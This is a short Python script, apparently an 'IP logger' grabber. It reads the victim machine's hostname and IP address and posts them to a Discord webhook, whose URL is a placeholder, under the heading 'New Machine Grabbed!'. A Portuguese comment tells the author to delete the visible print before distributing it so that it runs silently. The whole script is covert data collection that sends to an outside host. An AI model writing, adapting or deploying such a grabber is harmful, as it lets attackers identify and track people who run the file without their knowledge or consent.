from discord_webhook import DiscordWebhook, DiscordEmbed
import socket


hostname = socket.gethostname() 
ip = socket.gethostbyname(hostname)

hook= DiscordWebhook("https://discord.com/api/webhooks/XXXXXXXXXXXXXXXXXXXXXXXXXXX")

print(f"[ADMIN LOGS] - IP SENDED ON {hook} SUCESSFULY")#quando for mandar apague esse print!

embed= DiscordEmbed(title="‼️ New Machine Grabbed!",color="B30BFF")
embed.add_embed_field(name=f'<:lock:1036349073860595863> IP',value=f"```{ip}```")
embed.add_embed_field(name='<:star:1036349172837777468> Machine Name',value=f"```{hostname}```")
embed.set_footer(text="@IPLogger | 👑 hymaro")  

hook.add_embed(embed)
response = hook.execute()